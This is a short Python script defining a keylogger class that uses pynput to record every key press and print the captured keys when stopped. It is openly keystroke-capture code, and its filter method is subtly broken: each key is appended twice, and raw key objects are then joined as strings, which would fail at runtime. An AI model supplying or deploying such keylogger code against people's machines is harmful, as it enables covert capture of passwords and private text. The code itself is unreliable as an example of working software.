from pynput import keyboard
from IKeyLogger import *


class KeyBoard(IKeyLogger):
    def __init__(self):
        self.listening = None
        self.key_presses = []

    def start_listening(self) -> None:
        if self.listening is None:
            self.listening = keyboard.Listener(on_press=self.filter)
            self.listening.start()

    def stop_listening(self) -> None:
        if self.listening is not None:
            self.listening.stop()
            self.listening = None

    def get_listen_keys(self) -> str:
        return self.to_string(self.key_presses)

    def filter(self, key):
        try:
            self.key_presses.append(key.char)
        except AttributeError:
            key = key.name
            self.key_presses.append(key)
        self.key_presses.append(key)

    def to_string(self,key):
        key = [" " if k == 'space' else k for k in key]
        key = "".join(key)
        return key






if __name__ == "__main__":
    logger = KeyBoard()
    logger.start_listening()

    input("Press Enter to stop listening...\n")
    logger.stop_listening()

    print("Logged keys:", logger.get_listen_keys())
